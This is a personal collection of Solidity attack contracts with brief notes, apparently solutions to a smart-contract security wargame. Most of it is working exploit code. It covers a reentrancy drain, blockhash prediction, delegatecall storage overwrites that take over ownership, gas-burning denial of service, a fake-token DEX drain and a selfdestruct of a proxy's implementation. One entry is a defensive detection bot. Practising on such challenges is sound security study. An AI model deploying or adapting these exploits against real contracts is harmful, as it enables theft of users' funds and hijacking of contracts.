# Attack contracts

actual solidity i used. kept these around for reference.

---

## coinflip
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool) external returns (bool);
}

contract CoinFlipAttack {
    ICoinFlip target;
    uint256 constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    function attack() external {
        // compute same blockhash as the target will use
        uint256 h = uint256(blockhash(block.number - 1));
        bool guess = (h / FACTOR) == 1;
        target.flip(guess);
    }
}
```

**note:** had to call this once per block. set up a loop in hardhat to run it 10 times with delays.

---

## telephone
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address) external;
}

contract TelephoneAttack {
    function attack(address target) external {
        // msg.sender = this contract, tx.origin = your EOA
        ITelephone(target).changeOwner(msg.sender);
    }
}
```

---

## delegation
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DelegationAttack {
    function attack(address target) external {
        // send pwn() selector through the fallback
        (bool ok,) = target.call(abi.encodeWithSignature("pwn()"));
        require(ok);
    }
}
```

**note:** can also do this directly from console with sendTransaction. this contract is just cleaner.

---

## force
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceEth {
    constructor(address payable target) payable {
        // yeet some eth to target on deploy
        selfdestruct(target);
    }
}
```

**deploy with value** and it force-sends eth even though target has no payable functions.

---

## king
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    constructor(address payable target) payable {
        // become king
        (bool ok,) = target.call{value: msg.value}("");
        require(ok);
    }
    
    // no receive/fallback = we can't receive eth back
    // so transfer() to us will always fail and revert
}
```

---

## reentrancy
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address) external payable;
    function withdraw(uint) external;
}

contract ReentranceAttack {
    IReentrance public target;
    uint public amount;

    constructor(address _target) public {
        target = IReentrance(_target);
    }

    function attack() external payable {
        amount = msg.value;
        // donate first so we have a balance
        target.donate{value: msg.value}(address(this));
        // start the withdrawal loop
        target.withdraw(amount);
    }

    receive() external payable {
        // keep withdrawing until contract is empty
        uint bal = address(target).balance;
        if (bal > 0) {
            uint w = bal < amount ? bal : amount;
            target.withdraw(w);
        }
    }
}
```

**classic reentrancy.** withdraw sends eth before updating balance, so we just keep calling it.

---

## elevator
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint) external;
}

contract Building {
    bool toggle = true;
    IElevator target;

    constructor(address _target) {
        target = IElevator(_target);
    }

    function isLastFloor(uint) public returns (bool) {
        // flip our answer each time we're called
        toggle = !toggle;
        return toggle;
    }

    function attack() public {
        target.goTo(1);
    }
}
```

**key:** isLastFloor gets called twice, we return different values each time.

---

## gatekeeper one
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8) external returns (bool);
}

contract GatekeeperOneAttack {
    function attack(address target) external {
        // craft the key from our address
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        
        // brute force the gas offset
        for (uint256 i = 0; i < 8191; i++) {
            try IGatekeeperOne(target).enter{gas: 800000 + i}(key) {
                break; // found it
            } catch {}
        }
    }
}
```

**annoying gas check.** just brute force until gasleft % 8191 == 0.

---

## gatekeeper two
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8) external returns (bool);
}

contract GatekeeperTwoAttack {
    constructor(address target) {
        // call during construction (extcodesize = 0)
        // key = our address XOR max uint64
        bytes8 key = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
            type(uint64).max
        );
        IGatekeeperTwo(target).enter(key);
    }
}
```

**deploy this contract** and it auto-completes the level in the constructor.

---

## naught coin

no contract needed - just use the console:
```js
await token.approve(player, totalSupply);
await token.transferFrom(player, attackerAddress, totalSupply);
```

---

## preservation
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationAttack {
    // match the storage layout of Preservation contract
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint) public {
        // this runs in Preservation's context via delegatecall
        // so it overwrites Preservation's owner (slot 2)
        owner = msg.sender;
    }
}
```

**steps:**
1. call setFirstTime with this contract's address (overwrites timeZone1Library)
2. call setFirstTime again - now it delegatecalls to us and we overwrite owner

---

## denial
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DenialAttack {
    receive() external payable {
        // infinite loop to consume all gas
        while(true) {}
    }
}
```

**set this as partner.** when contract tries to send us eth, we burn all the gas.

---

## shop
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function buy() external;
    function isSold() external view returns (bool);
}

contract ShopAttack {
    IShop target;

    constructor(address _target) {
        target = IShop(_target);
    }

    function price() external view returns (uint) {
        // return 100 before buy, 0 after
        return target.isSold() ? 0 : 100;
    }

    function attack() external {
        target.buy();
    }
}
```

---

## dex two
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract FakeToken is ERC20 {
    constructor() ERC20("Fake", "FAKE") {
        _mint(msg.sender, 1_000_000 ether);
    }
}
```

**steps:**
1. deploy this token
2. send some to the DEX
3. swap it for the real tokens at whatever rate you want
4. drain both token1 and token2

---

## double entry point
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IForta {
    function raiseAlert(address user) external;
}

interface IDetectionBot {
    function handleTransaction(address user, bytes calldata msgData) external;
}

contract DetectionBot is IDetectionBot {
    address public vault;

    constructor(address _vault) {
        vault = _vault;
    }

    function handleTransaction(address user, bytes calldata msgData) external {
        // decode the delegateTransfer call
        // msgData is the full calldata including selector
        (, , address origSender) = abi.decode(msgData[4:], (address, uint256, address));
        
        // if origSender is the vault, raise alert
        if (origSender == vault) {
            IForta(msg.sender).raiseAlert(user);
        }
    }
}
```

**this one's defensive** - we're the good guys detecting the attack.

---

## good samaritan
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGoodSamaritan {
    function requestDonation() external returns (bool);
}

contract GoodSamaritanAttack {
    error NotEnoughBalance();

    IGoodSamaritan target;

    constructor(address _target) {
        target = IGoodSamaritan(_target);
    }

    function attack() external {
        target.requestDonation();
    }

    function notify(uint256 amount) external pure {
        // revert with the magic error when we get 10 coins
        // contract catches it and sends us everything instead
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
```

---

## motorbike
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MotorbikeAttack {
    function kill() external {
        selfdestruct(payable(msg.sender));
    }
}
```

**use this with upgradeToAndCall** after initializing the Engine directly.

---

## gatekeeper three
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function construct0r() external;
    function enter() external;
    function getAllowance(uint256) external;
}

contract GatekeeperThreeAttack {
    IGatekeeperThree target;

    constructor(address _target) payable {
        target = IGatekeeperThree(_target);
    }

    function attack() external {
        target.construct0r();       // become owner
        target.getAllowance(0);     // pass timestamp check
        target.enter();             // win
    }

    receive() external payable {}   // accept eth
}
```

**deploy with some eth** so the balance check passes.

---

**later levels (switch, higher order, stake, etc)**  
mostly used console/calldata tricks instead of contracts. see console-snippets.md for those.